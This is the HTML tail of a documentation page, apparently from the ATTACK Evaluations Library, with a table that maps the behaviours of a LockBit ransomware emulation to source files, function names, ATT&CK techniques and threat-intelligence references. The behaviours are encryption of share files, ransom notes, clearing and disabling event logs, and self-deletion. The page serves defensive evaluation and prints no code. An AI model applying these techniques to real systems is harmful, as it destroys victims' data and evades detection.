fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://redpiranha.net/news/look-lockbit-3-ransomware" class="outbound" target="_blank"><span>Red Piranha</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit enumerates target files in mounted file share <code v-pre>Z:</code> drive using FindFirstFileW and FindNextFileW</td>
<td><a href="../../resources/lockbit/src/common/enumerate.cpp#L67-L117">EnumerateAndEncrypt</a></td>
<td>T1083 File and Directory Discovery</td>
<td><a href="https://www.sangfor.com/farsight-labs-threat-intelligence/cybersecurity/lockbit-green-ransomware-conti-based-encryptor" class="outbound" target="_blank"><span>Sangfor</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit encrypts target files in mounted file share <code v-pre>Z:</code> drive using 256-bit AES</td>
<td><a href="../../resources/lockbit/src/common/impact/encryption.cpp#L333-L395">EncryptFileAndAppendExtension</a></td>
<td>T1486 Data Encrypted for Impact</td>
<td><a href="https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/" class="outbound" target="_blank"><span>Antiy</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://redpiranha.net/news/look-lockbit-3-ransomware" class="outbound" target="_blank"><span>Red Piranha</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit drops a ransom note in traversed directories</td>
<td><a href="../../resources/lockbit/src/common/enumerate.cpp#L277-L282">enumerateAndEncryptThreadFunc</a></td>
<td>T1491.001 Defacement: Internal Defacement</td>
<td><a href="https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/" class="outbound" target="_blank"><span>Antiy</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://redpiranha.net/news/look-lockbit-3-ransomware" class="outbound" target="_blank"><span>Red Piranha</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit modifies <code v-pre>HKCU\Control Panel\Desktop</code> via RegCreateKeyExW and RegSetValueExW</td>
<td><a href="../../resources/lockbit/src/common/impact/wallpaper.cpp#L26-L62">ChangeWallPaper</a></td>
<td>T1112 Modify Registry</td>
<td><a href="https://www.Antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/" class="outbound" target="_blank"><span>Antiy</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit changes the current user&#x27;s desktop wallpaper</td>
<td><a href="../../resources/lockbit/src/common/impact/wallpaper.cpp#L26-L62">ChangeWallPaper</a></td>
<td>T1491.001 Defacement: Internal Defacement</td>
<td><a href="https://www.Antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/" class="outbound" target="_blank"><span>Antiy</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit clears Windows Event Logs via EvtClearLog</td>
<td><a href="../../resources/lockbit/src/lockbit_main/tamper/event_log.cpp#L9-L159">ClearAndDisableEventLogs</a></td>
<td>T1070.001 Indicator Removal: Clear Windows Event Logs</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit disables event log channels via EvtSetChannelConfigProperty</td>
<td><a href="../../resources/lockbit/src/lockbit_main/tamper/event_log.cpp#L126-L151">ClearAndDisableEventLogs</a></td>
<td>T1562.002 Impair Defenses: Disable Windows Event Logging</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit spawns a helper process to overwrite, rename, and delete itself on completion</td>
<td><a href="../../resources/lockbit/src/lockbit_main/def_evasion/invoke_self_del.cpp">invoke_self_del.cpp</a></td>
<td>T1070.004 Indicator Removal: File Deletion</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
</tbody>
</table>
</div>
<hr>
<doc-anchor-target id="end-of-execution">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#end-of-execution">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F51A;</span> End of Execution</span>
    </h2>
</doc-anchor-target>

                                
                                <!-- Required only on API pages -->
                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                            </div>
                            <footer class="clear-both">
                            
                                <nav class="flex mt-14">
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../enterprise/lockbit/emulation_plan/">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                            <span>
                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
                                                <span class="block mt-1">Lock​Bit Emulation Plans</span>
                                            </span>
                                        </a>
                                    </div>
                            
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../enterprise/lockbit/emulation_plan/alternativesteps/">
                                            <span>
                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
                                                <span class="block mt-1">This is the ALTERNATIVE instruction set for the Scenario</span>
                                            </span>
                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                        </a>
                                    </div>
                                </nav>
                            </footer>
                        </main>
                
                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
                            <footer class="flex flex-wrap items-center justify-between">
                                <div>
                                    <ul class="flex flex-wrap items-center text-sm">
                                        <li>
                                            <a class="inline-flex items-center mr-4 py-2 text-sm whitespace-nowrap transition-colors duration-200 ease-linear text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200 md:mb-0" href="https://github.com/attackevals/ael">
                                                <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                    <g fill="currentColor">
                                                        <path d="M12 1C5.9225 1 1 5.9225 1 12C1 16.8675 4.14875 20.9787 8.52125 22.4362C9.07125 22.5325 9.2775 22.2025 9.2775 21.9137C9.2775 21.6525 9.26375 20.7862 9.26375 19.865C6.5 20.3737 5.785 19.1912 5.565 18.5725C5.44125 18.2562 4.905 17.28 4.4375 17.0187C4.0525 16.8125 3.5025 16.3037 4.42375 16.29C5.29 16.2762 5.90875 17.0875 6.115 17.4175C7.105 19.0812 8.68625 18.6137 9.31875 18.325C9.415 17.61 9.70375 17.1287 10.02 16.8537C7.5725 16.5787 5.015 15.63 5.015 11.4225C5.015 10.2262 5.44125 9.23625 6.1425 8.46625C6.0325 8.19125 5.6475 7.06375 6.2525 5.55125C6.2525 5.55125 7.17375 5.2625 9.2775 6.67875C10.1575 6.43125 11.0925 6.3075 12.0275 6.3075C12.9625 6.3075 13.8975 6.43125 14.7775 6.67875C16.8813 5.24875 17.8025 5.55125 17.8025 5.55125C18.4075 7.06375 18.0225 8.19125 17.9125 8.46625C18.6138 9.23625 19.04 10.2125 19.04 11.4225C19.04 15.6437 16.4688 16.5787 14.0213 16.8537C14.42 17.1975 14.7638 17.8575 14.7638 18.8887C14.7638 20.36 14.75 21.5425 14.75 21.9137C14.75 22.2025 14.9563 22.5462 15.5063 22.4362C19.8513 20.9787 23 16.8537 23 12C23 5.9225 18.0775 1 12 1Z"/>
                                                    </g>
                                                </svg>
                                                <span>ATTACK Evaluations Library GitHub</span>
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
                            </footer>
                        </div>
                    </div>
                
                    <!-- Rendered if sidebar right is enabled -->
                    <!-- Sidebar right skeleton-->
                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
                        <div class="pl-5">
                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                        </div>
                    </div>
                
                    <!-- User should be able to hide sidebar right -->
                    <doc-sidebar-right v-cloak></doc-sidebar-right>
                </div>

            </div>
        </div>
    
        <doc-search-mobile></doc-search-mobile>
        <doc-back-to-top></doc-back-to-top>
    </div>


    <div id="docs-overlay-target"></div>

    <script data-cfasync="false">window.__DOCS__ = { "title": "LockBit Scenario Overview", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
</body>
</html>
